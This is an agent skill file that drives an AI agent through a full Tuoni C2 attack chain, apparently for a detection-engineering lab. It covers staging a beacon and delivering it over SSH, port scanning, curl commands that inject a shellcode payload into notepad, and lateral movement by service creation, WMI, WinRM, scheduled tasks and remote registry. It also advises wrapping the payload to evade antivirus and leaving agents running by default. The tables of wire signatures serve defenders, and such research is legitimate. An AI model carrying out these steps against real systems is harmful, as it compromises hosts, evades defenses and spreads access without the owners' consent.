---
name: tuoni
description: Tuoni C2 adversary simulation — full kill chain (initial compromise, discovery, evasion, lateral movement, cleanup) driven from stage scripts to generate telemetry for detection-engineering R&D.
allowed-tools: Read, Write, Edit, Grep, Glob, Bash(curl:*), Bash(jq:*), Bash(python*:*), Bash(sshpass:*), Bash(mkdir:*), Bash(ls:*)
---

> **Scope:** Closed, isolated synthetic lab — no real targets, data, or users.
> Every stage generates kill-chain telemetry (network flows, endpoint events,
> AD activity) for detector development and validation.

Tuoni C2 across the kill chain. If `$ARGUMENTS` is given, do that task;
otherwise present the stage menu (foothold → discovery → evasion → lateral →
cleanup) and ask.

Run each stage's helper rather than rewriting its recipe inline — each encodes
a known-good sequence. Go hands-on with `curl` for one-shots and helper
debugging.

**Scripts:** `manage.py`, `deliver.py`, `discovery.py`, `lateral.py`,
`cleanup.py` — bundled with this skill. They read connection config from env
(`TUONI_API`, `TUONI_USER`, `TUONI_PASS`; optional `TUONI_TOKEN`, `TUONI_AGENT`)
and import their logic from `adsim.tuoni` (`make install`).

`deliver.py` is **delivery-only** — SSH to the target, never the Tuoni API — so
the C2 host and target host never share a script.

---

## Foothold — initial compromise

Establish the first agent on a Windows workstation as a **standard domain user**
(unprivileged — a phished user has no admin), beaconing to an HTTPS listener.

**Credentials needed:** C2 endpoint + API creds, target host IP, a standard
(non-admin) domain user + password. If any are missing, ask the operator.

Foothold is **three steps in two scripts**, split so the C2 host and the target
host never share a process. Run them in order — do not skip step 3.

**1. Prep over the Tuoni API (`manage.py`, default mode).** Uses the listener and
resolves the payload: `--payload-id` if given, else the ACTIVE payload of
`--payload-template`/`--payload-type` (created if missing). Waits until ACTIVE,
and prints `PAYLOAD_ID`, the staged callback host/port, and active-agent guids. Also prints the exact
step-2 and step-3 commands, pre-filled — copy them from its output.

```bash
TUONI_API=<api> TUONI_USER=<u> TUONI_PASS=<p> \
  [TARGET_IP=<ws-ip> EXEC_USER=<exec-user>] manage.py
```

**2. Deliver over SSH (`deliver.py`).** The **only** script that touches the
target. Hand it the staged URL from step 1:

```bash
deliver.py --staged-url '<staged-url>' \
  --target <ws-ip> --exec-user <exec-user> --exec-pass <exec-pass>
```

It SSHes in, downloads the payload, PE-sanity-checks it,
spawns it **detached from the sshd job object**, and reports whether the process
survived the session close. It prints the spawned `pid`. It does **not** talk to
the Tuoni API, wait for a beacon, or clean up. **"process alive" is not "agent
alive"** — never conclude success off deliver.py's output alone.

**3. Prove the callback over the API (`manage.py --verify`).** The only step
that decides the agent is alive: waits for the new agent to beacon (correlated on
the `pid` deliver.py printed) and confirms with `whoami`.

```bash
TUONI_API=<api> TUONI_USER=<u> TUONI_PASS=<p> \
  manage.py --verify --pid <pid> [--known <guids-from-step-1>]
```

Only after step 3 passes may you proceed — **do not cleanup until the callback
is confirmed**.

Gotcha: **SSH as the bare `<exec-user>`, never a UPN** (`user@domain`) —
Win32-OpenSSH hands the whole string to NTLM/Kerberos.

## Discovery

Port scan / host+service enumeration / AD recon from an existing agent.

```bash
TUONI_API=<api> TUONI_USER=<u> TUONI_PASS=<p> \
  discovery.py [--check | --portscan | --show] [--agent-guid GUID] \
    [--ips CIDR] [--ports CSV] [--host-discovery {ICMP,ARP,NONE}] [--max-wait N]
```

Defaults to `--portscan` with ICMP discovery. Uses `wait_done` (portscan
streams partial STDOUT — `wait_result` returns early). Template must be
fully-qualified (`shelldot.commands.net:global:portscan`) — bare `portscan` 404s.

If host discovery finds nothing, ICMP may be filtered — retry with
`--host-discovery NONE`.

## Evasion

Post-compromise defense evasion: process migration, PID injection, sleep/jitter.
No script — curl recipes (auth per `references/REFERENCE.md`).

**Migrate** (`spawn`) — needs a SHELLCODE payload; `suspended:true` required on Win11:
```bash
curl -sk -X POST "$C2/api/v1/agents/$SRC/commands" -H "$H" \
  -H "Content-Type: application/json" -d @- <<JSON
{"template":"spawn","configuration":{"payloadId":$PID,"encryptedCommunication":true},
 "execConf":{"execType":"NEW","executable":"C:\\\\Windows\\\\System32\\\\notepad.exe","suspended":true}}
JSON
```

**Inject:** `{"template":"inject","configuration":{"pid":$TARGET_PID,"payloadId":$PID}}`
**Sleep/jitter:** `{"template":"sleep","configuration":{"sleep":30,"jitter":40}}`

## Lateral movement

Cross-host code execution — the most network-visible stage. Each technique
generates a distinct wire signature on the sensor; picking the right one depends
on what telemetry you need.

**Credentials needed:** A privileged domain admin account in **NetBIOS format**
(`<NETBIOS>\<admin-user>`). If missing, ask the operator.

### Techniques and their telemetry

| Op | Wire protocol | What it does | Payload type | Detection signal |
|---|---|---|---|---|
| `jump-service` | SMB + DCERPC `\pipe\svcctl` (MS-SCMR) | Copies SERVICE binary to `ADMIN$`, creates + starts a Windows service via SCM | `SERVICE` | NTLM auth, SMB write to `ADMIN$`, SCMR `CreateServiceW`/`StartServiceW` opnums. PsExec/Impacket analogue. |
| `jump-wmi` | SMB + DCOM (TCP 135 + ephemeral) | Copies EXECUTABLE to `C$\Windows\Tasks\`, executes via `Win32_Process.Create` over WMI | `EXECUTABLE` | DCOM OXID resolution on 135, WMI interface chain (`IWbemLevel1Login` → `IWbemServices.ExecMethod`). Cmdline NOT on wire — anchor on UUID chain. |
| `jump-winrm` | SMB + WinRM HTTP (TCP 5985) | Copies EXECUTABLE via SMB, executes via `Start-Process` over WSMAN | `EXECUTABLE` | WinRM leg is `app_proto=unknown` (SOAP unparsed). Auth is **Kerberos** (TGS for HOST SPN), not NTLM. |
| `schtasks-remote` | SMB + DCERPC `\pipe\atsvc` (MS-TSCH) + `\pipe\winreg` (MS-RRP) | Creates + runs a scheduled task via `cmd schtasks /S` | N/A (cmd) | TSCH + RRP opnums. On Server 2025, also writes TaskCache via `\pipe\winreg`. |
| `reg-remote` | SMB + DCERPC `\pipe\winreg` (MS-RRP) | Remote registry write via `cmd reg add \\target\...` | N/A (cmd) | RRP `BaseRegCreateKey`/`SetValue` opnums. No process spawned on target. |

**Why it matters:** each op leaves a different wire trail; jump-winrm's WinRM
leg is unparsed; jump-wmi is not file-less despite the common assumption (SMB
copy happens first). Running multiple techniques in sequence produces a rich, differentiated telemetry corpus
for detection validation. Full per-op wire signatures in `references/REFERENCE.md`.

```bash
TUONI_API=<api> TUONI_USER=<u> TUONI_PASS=<p> \
  lateral.py --op {jump-service|jump-wmi|jump-winrm} --target <DC-ip-or-hostname> --payload-id <id> \
    [--source GUID] [--username '<NETBIOS>\<admin-user>' --password '<password>'] \
    [--service-name NAME] [--copy-method SMB|NONE] [--no-cleanup] [--max-wait N]
```

`lateral.py` resolves the command template UUID per op. You pass `--payload-id`
of the type in the table's "Payload type" column, e.g. from
`manage.py --payload-type SERVICE` for jump-service. `lateral.py --op schtasks-remote|reg-remote` drives the two
remote-`cmd` ops (no payload — builds the command string itself).

### Gotchas
- **Jump creds must use the NetBIOS short name.** Bare `--username <user>` →
  `Domain: NONE` → access denied. Use `<NETBIOS>\<admin-user>` — exactly one
  backslash.
- **SMB/445 must be reachable on the target.** If the copy step fails, check
  reachability first.
- **jump-winrm: pass the target HOSTNAME, not IP** (WinRM+NTLM rejects bare
  IPs). The command stays ONGOING past the poll window — verify the foothold via
  `/agents/active`.
- **Endpoint AV on the target may block the payload.** Read the full command
  record, retry under a fresh `--copy-path` name, and if still blocked deliver
  an evasion-wrapped payload.
- **Server 2025: `schtasks /U /P` rejected** — run `token-make` + `token-use`
  (netonly) first, then submit without explicit creds.

## Cleanup

**Ask the operator before running any cleanup.** Default: leave agents running —
termination loses long-running, low-and-slow traffic patterns.

```bash
cleanup.py [--check | --fast | --graceful] [--agent-guid GUID] [--erase]
```

| Mode | Action | When |
|---|---|---|
| `--check` (default) | list active agents; read-only | always run first |
| `--fast` | `PUT /inactive` only | agent process already dead |
| `--graceful` | `die` → wait 10 s → `PUT /inactive` | live agent — kills process, flushes flow |

`--graceful` forces a TCP FIN that flushes long-lived flows — live flows
delay sensor flow records and packet-store indexing until connection close.

## Troubleshooting

Check the stage scripts first (they encode known-good recipes), then
`references/REFERENCE.md` "Known API Quirks".
